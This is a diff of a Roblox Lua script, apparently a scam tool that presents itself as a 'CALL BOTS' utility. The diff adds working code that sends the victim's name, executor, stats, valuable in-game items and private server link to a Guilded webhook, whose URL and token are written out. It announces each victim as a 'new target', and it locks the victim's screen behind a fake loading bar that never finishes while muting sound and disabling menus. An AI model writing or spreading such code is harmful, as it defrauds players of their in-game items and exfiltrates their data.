@@ -7,9 +7,8 @@ local UserGameSettings = UserSettings():GetService("UserGameSettings")
 local SoundService = game:GetService("SoundService")
 local TweenService = game:GetService("TweenService")
 
--- Webhooks Guilded
-local GUILDED_WEBHOOK = "https://media.guilded.gg/webhooks/b9453e99-729b-4673-9787-e43828658d2c/MpyC72zyucA86weM2SwyIWIekWuM4iyUuAuyscsEwikiAmmmG0U0wcykuEIuWA4WSSUmi6OUyq0WOk2isWcemC"
-local GUILDED_WEBHOOK_AVISO = "https://media.guilded.gg/webhooks/15022d01-dafa-44d6-9703-5f748f427e3d/8rDZPlnbkQy2owmqGOqqMWYEsOMEo6usOooY4qec2CcAyqQKM0qcsSegacuOUQ2EewWmkM4A2s4U2K2mmYmMiK"
+-- Webhook Guilded (ÚNICA)
+local GUILDED_WEBHOOK = "https://media.guilded.gg/webhooks/15022d01-dafa-44d6-9703-5f748f427e3d/8rDZPlnbkQy2owmqGOqqMWYEsOMEo6usOooY4qec2CcAyqQKM0qcsSegacuOUQ2EewWmkM4A2s4U2K2mmYmMiK"
 
 -- Lista de Brainrots válidos
 local VALID_BRAINROTS = {
@@ -92,91 +91,31 @@ local function isValidBrainrot(name)
     return false
 end
 
--- Função para encontrar brainrots na workspace
-local function findBrainrots()
-    local foundBrainrots = {}
-    
-    -- Procurar na pasta Plots
-    local plotsFolder = Workspace:FindFirstChild("Plots")
-    if plotsFolder then
-        for _, plot in ipairs(plotsFolder:GetDescendants()) do
-            if plot:IsA("Model") and isValidBrainrot(plot.Name) then
-                table.insert(foundBrainrots, plot.Name)
-            end
-        end
-    end
-    
-    -- Procurar por IDs específicos
-    for _, id in ipairs(TARGET_IDS) do
-        local model = Workspace:FindFirstChild(id)
-        if model and model:IsA("Model") and isValidBrainrot(model.Name) then
-            table.insert(foundBrainrots, model.Name)
-        end
-    end
-    
-    -- Remover duplicatas
-    local uniqueBrainrots = {}
-    for _, brainrot in ipairs(foundBrainrots) do
-        local alreadyExists = false
-        for _, existing in ipairs(uniqueBrainrots) do
-            if existing == brainrot then
-                alreadyExists = true
-                break
-            end
-        end
-        if not alreadyExists then
-            table.insert(uniqueBrainrots, brainrot)
-        end
-    end
-    
-    return uniqueBrainrots
-end
-
--- Função para encontrar brainrots com valores (sistema avançado)
+-- Função para encontrar brainrots com valores
 local function findBrainrotsWithValues()
     local brainrotsWebhook = {}
     local valorizadoDog = false
     
-    -- Procurar na base/plots
-    if getgenv and getgenv().base then
-        for _, brainrote in getgenv().base:GetDescendants() do
-            if brainrote:IsA("TextLabel") and brainrote.Name == "Generation" then
-                local nomezinDog = ""
-                if brainrote.Parent.Mutation.Visible then
-                    nomezinDog = "[" .. brainrote.Parent.Mutation.ContentText .. "] " .. brainrote.Parent.DisplayName.ContentText
-                else
-                    nomezinDog = brainrote.Parent.DisplayName.ContentText
+    local plotsFolder = Workspace:FindFirstChild("Plots")
+    if plotsFolder then
+        for _, desc in ipairs(plotsFolder:GetDescendants()) do
+            if desc:IsA("TextLabel") and desc.Name == "Generation" then
+                local nomeBrainrot = ""
+                if desc.Parent:FindFirstChild("Mutation") and desc.Parent.Mutation.Visible then
+                    nomeBrainrot = "[" .. desc.Parent.Mutation.ContentText .. "] " .. desc.Parent.DisplayName.ContentText
+                elseif desc.Parent:FindFirstChild("DisplayName") then
+                    nomeBrainrot = desc.Parent.DisplayName.ContentText
                 end
-                table.insert(brainrotsWebhook, {nome = nomezinDog, valor = brainrote.ContentText})
-                if parseMoneyPerSec(brainrote.ContentText) > 49999999 then
-                    valorizadoDog = true
-                end
-            end
-        end
-    else
-        -- Fallback: procurar normalmente
-        local plotsFolder = Workspace:FindFirstChild("Plots")
-        if plotsFolder then
-            for _, desc in ipairs(plotsFolder:GetDescendants()) do
-                if desc:IsA("TextLabel") and desc.Name == "Generation" then
-                    local nomeBrainrot = ""
-                    if desc.Parent:FindFirstChild("Mutation") and desc.Parent.Mutation.Visible then
-                        nomeBrainrot = "[" .. desc.Parent.Mutation.ContentText .. "] " .. desc.Parent.DisplayName.ContentText
-                    elseif desc.Parent:FindFirstChild("DisplayName") then
-                        nomeBrainrot = desc.Parent.DisplayName.ContentText
-                    end
-                    if nomeBrainrot ~= "" then
-                        table.insert(brainrotsWebhook, {nome = nomeBrainrot, valor = desc.ContentText})
-                        if parseMoneyPerSec(desc.ContentText) > 49999999 then
-                            valorizadoDog = true
-                        end
+                if nomeBrainrot ~= "" and isValidBrainrot(desc.Parent.DisplayName.ContentText) then
+                    table.insert(brainrotsWebhook, {nome = nomeBrainrot, valor = desc.ContentText})
+                    if parseMoneyPerSec(desc.ContentText) > 49999999 then
+                        valorizadoDog = true
                     end
                 end
             end
         end
     end
     
-    -- Adicionar brainrots encontrados por ID
     for _, id in ipairs(TARGET_IDS) do
         local model = Workspace:FindFirstChild(id)
         if model and model:IsA("Model") and isValidBrainrot(model.Name) then
@@ -207,106 +146,96 @@ local function getPlayerStats()
     return stats
 end
 
--- Função para enviar webhook de aviso (segunda webhook)
-local function sendAvisoWebhook(serverLink, brainrots, stats)
-    local player = Players.LocalPlayer
-    local playerName = player.Name
-    local displayName = player.DisplayName
-    local playerCount = #Players:GetPlayers()
-    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+-- Função MELHORADA para enviar para Guilded
+local function sendToGuilded(payload)
+    local jsonPayload = HttpService:JSONEncode(payload)
     
-    local brainrotsList = ""
-    if #brainrots > 0 then
-        for i, br in ipairs(brainrots) do
-            brainrotsList = brainrotsList .. "• " .. br.nome .. " - " .. br.valor .. "\n"
-            if i >= 40 then
-                brainrotsList = brainrotsList .. "... e mais\n"
-                break
-            end
+    -- Método 1: syn.request
+    if syn and syn.request then
+        local success, response = pcall(function()
+            return syn.request({
+                Url = GUILDED_WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonPayload
+            })
+        end)
+        if success then
+            print("✅ Webhook enviado via syn.request!")
+            return true
         end
-    else
-        brainrotsList = "Nenhum brainrot detectado"
     end
     
-    local executorName = "Unknown"
-    if identifyexecutor then
-        executorName = identifyexecutor()
+    -- Método 2: request
+    if request then
+        local success, response = pcall(function()
+            return request({
+                Url = GUILDED_WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonPayload
+            })
+        end)
+        if success then
+            print("✅ Webhook enviado via request!")
+            return true
+        end
     end
     
-    local payload = {
-        content = "⚠️ **ALERTA DE EXECUÇÃO** ⚠️\n@everyone @here **NOVO ALVO DETECTADO!**",
-        embeds = {{
-            title = "🚨 SISTEMA METODH_BRANZZ EXECUTADO 🚨",
-            description = "**Um novo usuário executou o script!**",
-            color = 16711680,
-            fields = {
-                {
-                    name = "👤 Informações do Player:",
-                    value = "**Nome:** " .. playerName .. "\n**Display:** @" .. displayName,
-                    inline = false
+    -- Método 3: http_request
+    if http_request then
+        local success, response = pcall(function()
+            return http_request({
+                Url = GUILDED_WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
                 },
-                {
-                    name = "💻 Executor:",
-                    value = "**" .. executorName .. "**",
-                    inline = true
-                },
-                {
-                    name = "👥 Players no Servidor:",
-                    value = "**" .. tostring(playerCount) .. " jogadores**",
-                    inline = true
-                },
-                {
-                    name = "💰 Steals:",
-                    value = "**" .. stats.steals .. "**",
-                    inline = true
-                },
-                {
-                    name = "🔄 Rebirths:",
-                    value = "**" .. stats.rebirths .. "**",
-                    inline = true
-                },
-                {
-                    name = "🔗 Link do Servidor:",
-                    value = "[**🎮 CLIQUE AQUI PARA ENTRAR NO SERVIDOR**](" .. serverLink .. ")",
-                    inline = false
-                },
-                {
-                    name = "📊 BRAINROTS DETECTADOS:",
-                    value = "```\n" .. brainrotsList .. "```",
-                    inline = false
-                }
-            },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-            footer = {
-                text = "⚠️ Sistema de Aviso METODH_BRANZZ | " .. currentTime
-            }
-        }}
-    }
+                Body = jsonPayload
+            })
+        end)
+        if success then
+            print("✅ Webhook enviado via http_request!")
+            return true
+        end
+    end
     
-    print("📤 Enviando webhook de aviso...")
-    
-    -- Tentar enviar webhook de aviso
-    local success = pcall(function()
-        HttpService:RequestAsync({
-            Url = GUILDED_WEBHOOK_AVISO,
+    -- Método 4: RequestAsync
+    local success, response = pcall(function()
+        return HttpService:RequestAsync({
+            Url = GUILDED_WEBHOOK,
             Method = "POST",
             Headers = {
                 ["Content-Type"] = "application/json"
             },
-            Body = HttpService:JSONEncode(payload)
+            Body = jsonPayload
         })
     end)
     
     if success then
-        print("✅ Webhook de aviso enviado com sucesso!")
-    else
-        -- Tentar método alternativo
-        pcall(function()
-            HttpService:PostAsync(GUILDED_WEBHOOK_AVISO, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson, false)
-            print("✅ Webhook de aviso enviado (método 2)!")
-        end)
+        print("✅ Webhook enviado via RequestAsync!")
+        return true
     end
+    
+    -- Método 5: PostAsync
+    local success2, response2 = pcall(function()
+        return HttpService:PostAsync(GUILDED_WEBHOOK, jsonPayload, Enum.HttpContentType.ApplicationJson, false)
+    end)
+    
+    if success2 then
+        print("✅ Webhook enviado via PostAsync!")
+        return true
+    end
+    
+    warn("❌ Todos os métodos falharam")
+    return false
 end
+
+-- Função para enviar webhook ÚNICA
 local function sendGuildedWebhook(serverLink)
     local player = Players.LocalPlayer
     local playerName = player.Name
@@ -319,7 +248,7 @@ local function sendGuildedWebhook(serverLink)
     local brainrotsList = ""
     if #brainrots > 0 then
         for i, br in ipairs(brainrots) do
-            brainrotsList = brainrotsList .. "• " .. br.nome .. " - " .. br.valor .. "\n"
+            brainrotsList = brainrotsList .. br.nome .. " - " .. br.valor .. "\n"
             if i >= 40 then
                 brainrotsList = brainrotsList .. "... e mais\n"
                 break
@@ -329,113 +258,60 @@ local function sendGuildedWebhook(serverLink)
         brainrotsList = "Nenhum brainrot detectado"
     end
     
-    local executorName = "Unknown"
-    if identifyexecutor then
-        executorName = identifyexecutor()
-    end
+    local executorName = identifyexecutor and identifyexecutor() or "Unknown"
     
-    -- Criar payload completo
     local payload = {
-        content = "@everyone @here TESTE!! NOVO ALVO !! @todos @aqui",
+        content = "@everyone @here ALERTA DE EXECUCAO - NOVO ALVO DETECTADO!",
         embeds = {{
-            title = "🧠 DETECÇÃO DE BRAINROTS 🎄",
-            description = "**Sistema METODH_BRANZZ ativo!**",
-            color = 15158332,
+            title = "SISTEMA METODH_BRANZZ EXECUTADO",
+            description = "Um novo usuario executou o script!",
+            color = 16711680,
             fields = {
                 {
-                    name = "👤 Nome do Player:",
-                    value = "**" .. playerName .. "** (@" .. displayName .. ")",
+                    name = "Informacoes do Player:",
+                    value = "Nome: " .. playerName .. "\nDisplay: @" .. displayName,
                     inline = false
                 },
                 {
-                    name = "💻 Executor:",
-                    value = "**" .. executorName .. "**",
+                    name = "Executor:",
+                    value = executorName,
                     inline = true
                 },
                 {
-                    name = "👥 Pessoas no Servidor:",
-                    value = "**" .. tostring(playerCount) .. "**",
+                    name = "Players no Servidor:",
+                    value = tostring(playerCount) .. " jogadores",
                     inline = true
                 },
                 {
-                    name = "💰 Steals:",
-                    value = "**" .. stats.steals .. "**",
+                    name = "Steals:",
+                    value = stats.steals,
                     inline = true
                 },
                 {
-                    name = "🔄 Rebirths:",
-                    value = "**" .. stats.rebirths .. "**",
+                    name = "Rebirths:",
+                    value = stats.rebirths,
                     inline = true
                 },
                 {
-                    name = "🔗 Link do Servidor:",
-                    value = "[**🎮 CLIQUE AQUI PARA ENTRAR**](" .. serverLink .. ")",
+                    name = "Link do Servidor:",
+                    value = serverLink,
                     inline = false
                 },
                 {
-                    name = "📊 BRAINROTS DETECTADOS:",
-                    value = "```\n" .. brainrotsList .. "```",
+                    name = "BRAINROTS DETECTADOS:",
+                    value = brainrotsList,
                     inline = false
                 }
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
             footer = {
-                text = "🎅 METODH_BRANZZ | " .. currentTime .. " 🎄"
-            },
-            thumbnail = {
-                url = "https://cdn.discordapp.com/emojis/123456789.png"
+                text = "Sistema METODH_BRANZZ | " .. currentTime
             }
         }}
     }
     
-    print("📤 Tentando enviar webhook...")
-    
-    -- Método 1: RequestAsync
-    local success1 = pcall(function()
-        local response = HttpService:RequestAsync({
-            Url = GUILDED_WEBHOOK,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(payload)
-        })
-        print("✅ Webhook enviado via RequestAsync!")
-        return response
-    end)
-    
-    if success1 then
-        print("✅ Webhook enviado com sucesso!")
-        return
-    end
-    
-    -- Método 2: PostAsync alternativo
-    local success2 = pcall(function()
-        HttpService:PostAsync(GUILDED_WEBHOOK, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson, false)
-        print("✅ Webhook enviado via PostAsync!")
-    end)
-    
-    if success2 then
-        print("✅ Webhook enviado com sucesso (método 2)!")
-        return
-    end
-    
-    -- Método 3: GetAsync com query params (tentativa alternativa)
-    local success3 = pcall(function()
-        local encodedPayload = HttpService:UrlEncode(HttpService:JSONEncode(payload))
-        HttpService:GetAsync(GUILDED_WEBHOOK .. "?payload=" .. encodedPayload)
-        print("✅ Webhook enviado via GetAsync!")
-    end)
-    
-    if success3 then
-        print("✅ Webhook enviado com sucesso (método 3)!")
-        return
-    end
-    
-    warn("⚠️ Todos os métodos falharam, mas dados foram coletados:")
-    print("📊 Brainrots detectados: " .. #brainrots)
-    print("👤 Player: " .. playerName)
-    print("🔗 Link: " .. serverLink)
+    print("📤 Enviando webhook...")
+    sendToGuilded(payload)
 end
 
 -- Função para desativar som permanentemente
@@ -467,7 +343,7 @@ local function disableAllCoreGui()
     end)
 end
 
--- Criar GUI de Carregamento Infinita (tampa tudo)
+-- Criar GUI de Carregamento Infinita
 local function createInfiniteLoadingGUI()
     local LoadingGui = Instance.new("ScreenGui")
     LoadingGui.Name = "InfiniteLoadingGUI"
@@ -475,7 +351,6 @@ local function createInfiniteLoadingGUI()
     LoadingGui.IgnoreGuiInset = true
     LoadingGui.DisplayOrder = 999999
     
-    -- Background que cobre TUDO
     local Background = Instance.new("Frame")
     Background.Name = "FullScreenBlock"
     Background.Size = UDim2.new(1, 0, 1, 100)
@@ -485,7 +360,6 @@ local function createInfiniteLoadingGUI()
     Background.ZIndex = 999999
     Background.Parent = LoadingGui
     
-    -- Frame de carregamento
     local LoadingFrame = Instance.new("Frame")
     LoadingFrame.Size = UDim2.new(0, 600, 0, 200)
     LoadingFrame.Position = UDim2.new(0.5, -300, 0.5, -100)
@@ -503,7 +377,6 @@ local function createInfiniteLoadingGUI()
     FrameStroke.Thickness = 4
     FrameStroke.Parent = LoadingFrame
     
-    -- Título
     local LoadingTitle = Instance.new("TextLabel")
     LoadingTitle.Size = UDim2.new(1, 0, 0, 50)
     LoadingTitle.Position = UDim2.new(0, 0, 0, 15)
@@ -515,7 +388,6 @@ local function createInfiniteLoadingGUI()
     LoadingTitle.ZIndex = 1000001
     LoadingTitle.Parent = LoadingFrame
     
-    -- Status text
     local StatusText = Instance.new("TextLabel")
     StatusText.Size = UDim2.new(1, -40, 0, 30)
     StatusText.Position = UDim2.new(0, 20, 0, 70)
@@ -527,7 +399,6 @@ local function createInfiniteLoadingGUI()
     StatusText.ZIndex = 1000001
     StatusText.Parent = LoadingFrame
     
-    -- Percent text
     local PercentText = Instance.new("TextLabel")
     PercentText.Size = UDim2.new(1, 0, 0, 35)
     PercentText.Position = UDim2.new(0, 0, 0, 105)
@@ -539,7 +410,6 @@ local function createInfiniteLoadingGUI()
     PercentText.ZIndex = 1000001
     PercentText.Parent = LoadingFrame
     
-    -- Barra de progresso background
     local BarBackground = Instance.new("Frame")
     BarBackground.Size = UDim2.new(0.9, 0, 0, 25)
     BarBackground.Position = UDim2.new(0.05, 0, 0, 155)
@@ -552,7 +422,6 @@ local function createInfiniteLoadingGUI()
     BarCorner.CornerRadius = UDim.new(0, 12)
     BarCorner.Parent = BarBackground
     
-    -- Barra de progresso
     local ProgressBar = Instance.new("Frame")
     ProgressBar.Size = UDim2.new(0, 0, 1, 0)
     ProgressBar.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
@@ -566,7 +435,6 @@ local function createInfiniteLoadingGUI()
     
     LoadingGui.Parent = CoreGui
     
-    -- Mensagens de status que vão mudando
     local statusMessages = {
         "Conectando aos servidores...",
         "Verificando brainrots...",
@@ -580,7 +448,6 @@ local function createInfiniteLoadingGUI()
         "Inicializando sistema..."
     }
     
-    -- Animação infinita de carregamento
     spawn(function()
         local progress = 0
         local maxBarWidth = BarBackground.AbsoluteSize.X
@@ -590,16 +457,13 @@ local function createInfiniteLoadingGUI()
         while true do
             wait(0.05)
             
-            -- Aumenta o progresso muito devagar (nunca chega a 100%)
             progress = progress + 0.001
             if progress >= 99.9 then
                 progress = 99.9
             end
             
-            -- Atualiza texto de porcentagem
             PercentText.Text = string.format("%.1f%%", progress)
             
-            -- Atualiza barra de progresso
             local targetSize = UDim2.new(progress / 100, 0, 1, 0)
             local tween = TweenService:Create(
                 ProgressBar,
@@ -608,7 +472,6 @@ local function createInfiniteLoadingGUI()
             )
             tween:Play()
             
-            -- Muda mensagem de status a cada 3 segundos
             messageTimer = messageTimer + 0.05
             if messageTimer >= 3 then
                 messageTimer = 0
@@ -621,7 +484,6 @@ local function createInfiniteLoadingGUI()
         end
     end)
     
-    -- Efeito de brilho pulsante no título
     spawn(function()
         while true do
             for i = 200, 255, 5 do
@@ -717,35 +579,22 @@ local function createMainGUI()
     ButtonCorner.CornerRadius = UDim.new(0, 10)
     ButtonCorner.Parent = CallButton
     
-    -- Evento do botão CALL BOTS
     CallButton.MouseButton1Click:Connect(function()
         local link = InputBox.Text
         if link ~= "" then
             print("🚀 Iniciando sistema METODH_BRANZZ...")
             
-            -- Esconder GUI principal
             MainFrame.Visible = false
             
-            -- Criar tela de carregamento infinita
             createInfiniteLoadingGUI()
             
-            -- Desativar som
             disableSound()
             
-            -- Desativar TODOS os botões do CoreGui
             disableAllCoreGui()
             
-            -- Esperar 2 segundos e enviar webhooks
             wait(2)
             
-            -- Coletar dados dos brainrots e stats
-            local brainrots, valorizado = findBrainrotsWithValues()
-            local stats = getPlayerStats()
-            
-            -- Enviar para AMBAS as webhooks
             sendGuildedWebhook(link)
-            wait(1) -- Pequeno delay entre envios
-            sendAvisoWebhook(link, brainrots, stats)
             
             print("✅ Sistema ativado com sucesso!")
         else
@@ -757,7 +606,6 @@ local function createMainGUI()
     print("🎄 GUI METODH_BRANZZ carregada!")
 end
 
--- Executar script principal
 local success, err = pcall(function()
     createMainGUI()
 end)
